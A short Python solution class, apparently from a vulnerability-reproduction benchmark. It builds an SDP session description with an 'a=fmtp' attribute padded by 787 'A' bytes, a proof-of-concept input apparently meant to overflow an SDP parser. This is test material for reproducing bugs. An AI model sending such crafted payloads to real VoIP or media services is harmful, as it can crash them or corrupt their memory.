class Solution:
    def solve(self, src_path: str) -> bytes:
        header = (
            b"v=0\n"
            b"o=- 0 0 IN IP4 127.0.0.1\n"
            b"s=-\n"
            b"c=IN IP4 0.0.0.0\n"
            b"t=0 0\n"
            b"m=audio 0 RTP/AVP 0\n"
            b"a=fmtp:0 "
        )
        filler = b"A" * 787
        poc = header + filler + b"\r\n"
        return poc